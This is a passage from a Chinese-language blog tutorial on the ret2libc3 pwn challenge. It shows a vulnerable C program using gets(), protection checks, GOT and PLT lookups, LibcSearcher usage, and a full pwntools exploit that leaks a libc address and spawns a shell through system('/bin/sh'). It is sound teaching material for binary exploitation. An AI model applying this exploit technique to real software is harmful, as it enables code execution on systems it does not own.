class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> secretcode, input;</span><br><span class="line">    srand(time(<span class="literal">NULL</span>));</span><br><span class="line"></span><br><span class="line">    secretcode = rand();</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;input);</span><br><span class="line">    <span class="keyword">if</span>(input == secretcode)</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"no_shell_QQ"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L, <span class="number">1</span>, <span class="number">0L</span>L);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> buf1[<span class="number">100</span>];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"No surprise anymore, system disappeard QQ.\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Can you find it !?"</span>);</span><br><span class="line">    gets(buf1);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>这程序当中没有system()函数和”/bin/sh“字符串，虽然给出了libc.so文件，但是我们不用，假装我们没有libc<br>我们还是先检查保护机制:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@sir-PC:/ret2libc3# checksec ret2libc3</span><br><span class="line">[*] &apos;/ret2libc3&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure></p>
+<p>同样的没有开启Stack和PIE，所以这道题的思路就是利用puts()函数来泄露出某个函数在libc中的地址，然后在这个网站或通过LibcSearcher工具查询地址低12位来确定libc的版本<br>这道题我是通过puts()函数将<strong>libc_start_main在libc中的地址泄露出来，然后通过LibcSearcher去查找libc的版本，最终得到system()函数和”/bin/sh”字符串的地址<br>不过需要注意的，这个LibcSearcher工具找到libc版本可能有多个，需要你去判断，而且得到的字符串的地址不一定刚刚好，可能需要通过调试去验证。。。<br>先查看</strong>libc_start_main的got表地址：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">root@sir-PC:/ret2libc3<span class="comment"># objdump -R ret2libc3</span></span><br><span class="line"></span><br><span class="line">ret2libc3：     文件格式 elf32-i386</span><br><span class="line"></span><br><span class="line">DYNAMIC RELOCATION RECORDS</span><br><span class="line">OFFSET   TYPE              VALUE </span><br><span class="line">08049ffc R_386_GLOB_DAT    __gmon_start__</span><br><span class="line">0804a040 R_386_COPY        stdin@@GLIBC_2.0</span><br><span class="line">0804a060 R_386_COPY        stdout@@GLIBC_2.0</span><br><span class="line">0804a00c R_386_JUMP_SLOT   <span class="built_in">printf</span>@GLIBC_2.0</span><br><span class="line">0804a010 R_386_JUMP_SLOT   gets@GLIBC_2.0</span><br><span class="line">0804a014 R_386_JUMP_SLOT   time@GLIBC_2.0</span><br><span class="line">0804a018 R_386_JUMP_SLOT   puts@GLIBC_2.0</span><br><span class="line">0804a01c R_386_JUMP_SLOT   __gmon_start__</span><br><span class="line">0804a020 R_386_JUMP_SLOT   srand@GLIBC_2.0</span><br><span class="line">0804a024 R_386_JUMP_SLOT   __libc_start_main@GLIBC_2.0 //这个函数用起方便</span><br><span class="line">0804a028 R_386_JUMP_SLOT   setvbuf@GLIBC_2.0</span><br><span class="line">0804a02c R_386_JUMP_SLOT   rand@GLIBC_2.0</span><br><span class="line">0804a030 R_386_JUMP_SLOT   __isoc99_scanf@GLIBC_2.7</span><br></pre></td></tr></table></figure></p>
+<p>找puts()函数的plt表：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">root@sir-PC:/ret2libc3<span class="comment"># objdump -dj .plt ret2libc3</span></span><br><span class="line"></span><br><span class="line">ret2libc3：     文件格式 elf32-i386</span><br><span class="line"></span><br><span class="line">Disassembly of section .plt:</span><br><span class="line">...</span><br><span class="line">08048460 &lt;puts@plt&gt;:</span><br><span class="line"> 8048460:	ff 25 18 a0 04 08    	jmp    *0x804a018</span><br><span class="line"> 8048466:	68 18 00 00 00       	push   <span class="variable">$0x18</span></span><br><span class="line"> 804846b:	e9 b0 ff ff ff       	jmp    8048420 &lt;.plt&gt;</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p>
+<p>这里先提一下LibcSearcher的安装及其用法：</p>
+<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/lieanu/LibcSearcher.git</span><br><span class="line"><span class="built_in">cd</span> LibcSearcher</span><br><span class="line">python setup.py develop</span><br></pre></td></tr></table></figure>
+<h1 id="用法演示"><a href="#用法演示" class="headerlink" title="用法演示"></a>用法演示</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#第二个参数，为已泄露的实际地址,或最后12位(比如：d90)，int类型</span></span><br><span class="line">obj = LibcSearcher(<span class="string">"fgets"</span>, <span class="number">0X7ff39014bd90</span>)</span><br><span class="line"></span><br><span class="line">obj.dump(<span class="string">"system"</span>)        <span class="comment">#system 偏移</span></span><br><span class="line">obj.dump(<span class="string">"str_bin_sh"</span>)    <span class="comment">#/bin/sh 偏移</span></span><br><span class="line">obj.dump(<span class="string">"__libc_start_main_ret"</span>)</span><br></pre></td></tr></table></figure>
+<p>如果遇到返回多个libc版本库的情况，可以通过add_condition(leaked_func, leaked_address)来添加限制条件，也可以手工选择其中一个libc版本</p>
+<hr>
+<h2 id="EXP3"><a href="#EXP3" class="headerlink" title="EXP3"></a>EXP3</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line">p = process(<span class="string">'./ret2libc3'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">start_addr = <span class="number">0x80484d0</span></span><br><span class="line">puts_plt_addr = <span class="number">0x8048460</span></span><br><span class="line">libc_start_main_got_addr = <span class="number">0x804a024</span></span><br><span class="line">p.recvuntil(<span class="string">'Can you find it !?'</span>)</span><br><span class="line">p.sendline(<span class="string">'q'</span>*<span class="number">112</span> + p32(puts_plt_addr) + p32(start_addr) + p32(libc_start_main_got_addr))</span><br><span class="line">libc_start_main_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">"__libc_start_main_addr: "</span> + hex(libc_start_main_addr)</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">'__libc_start_main'</span>, libc_start_main_addr)</span><br><span class="line">libcbase = libc_start_main_addr - libc.dump(<span class="string">'__libc_start_main'</span>)</span><br><span class="line">system_addr = libcbase + libc.dump(<span class="string">'system'</span>)</span><br><span class="line">binsh_addr = libcbase + libc.dump(<span class="string">'str_bin_sh'</span>) + <span class="number">0xb9</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"system_addr: "</span> + hex(system_addr)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"binsh_addr: "</span> + hex(binsh_addr)</span><br><span class="line">p.recvuntil(<span class="string">'Can you find it !?'</span>)</span><br><span class="line">p.sendline(<span class="string">'s'</span>*<span class="number">112</span> + p32(system_addr) + <span class="string">'aaaa'</span> + p32(binsh_addr))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<hr>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这些ret2libc应该是属于ROP技术里面的基本操作，要求熟练掌握……</p>
+
+      
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/2019/01/26/ret2libc/">Ret2libc</a></p>
+        <p><span>文章作者:</span><a href="/" title="访问 钞sir 的个人博客">钞sir</a></p>
+        <p><span>发布时间:</span>2019年01月26日 - 22时05分</p>
+        <p><span>最后更新:</span>2019年01月26日 - 22时03分</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2019/01/26/ret2libc/" title="Ret2libc">https://cc-sir.github.io/2019/01/26/ret2libc/</a>
+            <span class="copy-path" data-clipboard-text="原文: https://cc-sir.github.io/2019/01/26/ret2libc/　　作者: 钞sir" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script src="/js/clipboard.min.js"></script>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/3.0/cn/" title="中国大陆 (CC BY-NC-SA 3.0 CN)" target="_blank">"署名-非商用-相同方式共享 3.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+<nav id="article-nav">
+  
+  
+    <a href="/2019/01/24/ret2shellcode/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">Ret2ShellCode</div>
+      <strong class="article-nav-caption">></strong>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+    <strong class="toc-title">文章目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#简介"><span class="toc-number">1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#基本思路"><span class="toc-number">2.</span> <span class="toc-text">基本思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ret2libc1"><span class="toc-number">3.</span> <span class="toc-text">ret2libc1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EXP1"><span class="toc-number">4.</span> <span class="toc-text">EXP1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ret2libc2"><span class="toc-number">5.</span> <span class="toc-text">ret2libc2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EXP2"><span class="toc-number">6.</span> <span class="toc-text">EXP2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ret2libc3"><span class="toc-number">7.</span> <span class="toc-text">ret2libc3</span></a></li></ol><li class="toc-item toc-level-1"><a class="toc-link" href="#安装"><span class="toc-number"></span> <span class="toc-text">安装</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#用法演示"><span class="toc-number"></span> <span class="toc-text">用法演示</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#EXP3"><span class="toc-number">1.</span> <span class="toc-text">EXP3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#总结"><span class="toc-number">2.</span> <span class="toc-text">总结</span></a></li></ol>
+</li></div>
+<input type="button" id="tocButton" value="隐藏目录" title="点击按钮隐藏或者显示文章目录">
+
+<script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+<script>
+    var valueHide = "隐藏目录";
+    var valueShow = "显示目录";
+
+    if ($(".left-col").is(":hidden")) {
+        $("#tocButton").attr("value", valueShow);
+    }
+    $("#tocButton").click(function() {
+        if ($("#toc").is(":hidden")) {
+            $("#tocButton").attr("value", valueHide);
+            $("#toc").slideDown(320);
+        }
+        else {
+            $("#tocButton").attr("value", valueShow);
+            $("#toc").slideUp(350);
+        }
+    })
+    if ($(".toc").length < 1) {
+        $("#toc, #tocButton").hide();
+    }
+</script>
+
+
+
+
+
+
+
+    
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
+        
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+        
+            <a href="/2019/01/24/ret2shellcode/" title="下一篇: Ret2ShellCode">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2019/01/26/ret2libc/">Ret2libc</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/24/ret2shellcode/">Ret2ShellCode</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/20/overflow_freed_chunk/">Overflow Freed Chunk</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/19/Fastbin_Double_Free/">Fastbin Double Free</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/11/use_after_free/">Use After Free</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/11/hello-world/">Hello World</a></li></ul>
+    <script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+    <script>
+        $(".post-list").addClass("toc-article");
+        $(".post-list-item a").attr("target","_blank");
+        $("#post-nav-button > a:nth-child(2)").click(function() {
+            $(".fa-bars, .fa-times").toggle();
+            $(".post-list").toggle(300);
+            if ($(".toc").length > 0) {
+                $("#toc, #tocButton").toggle(200, function() {
+                    if ($(".switch-area").is(":visible")) {
+                        $("#tocButton").attr("value", valueHide);
+                        }
+                    })
+            }
+            else {
+            }
+        })
+    </script>
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                &copy; 2019 钞sir
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/luuman/hexo-theme-spfk" target="_blank">spfk</a> by luuman
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style="display:none">
+                        <span id="site-visit">海贼到访数: 
+                            <span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>, </span>
+                
+                
+                    <span id="busuanzi_container_page_pv" style="display:none">
+                        <span id="page-visit">本页阅读量: 
+                            <span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+        
+    </div>
+</footer>
+
+    </div>
+    <script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+<script src="/js/main.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var backgroundnum = 24;
+            var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+            $("#mobile-nav").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
+            $(".left-col").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
+        })
+    </script>
+
+
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    $(document).ready(function() {
+        if ($("#comments").length < 1) {
+            $("#scroll > a:nth-child(2)").hide();
+        };
+    })
+</script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+
+  <script language="javascript">
+    $(function() {
+        $("a[title]").each(function() {
+            var a = $(this);
+            var title = a.attr('title');
+            if (title == undefined || title == "") return;
+            a.data('title', title).removeAttr('title').hover(
+
+            function() {
+                var offset = a.offset();
+                $("<div id=\"anchortitlecontainer\"></div>").appendTo($("body")).html(title).css({
+                    top: offset.top - a.outerHeight() - 15,
+                    left: offset.left + a.outerWidth()/2 + 1
+                }).fadeIn(function() {
+                    var pop = $(this);
+                    setTimeout(function() {
+                        pop.remove();
+                    }, pop.text().length * 800);
+                });
+            }, function() {
+                $("#anchortitlecontainer").remove();
+            });
+        });
+    });
+</script>
+
+
+  </div>
+</body>
+</html>
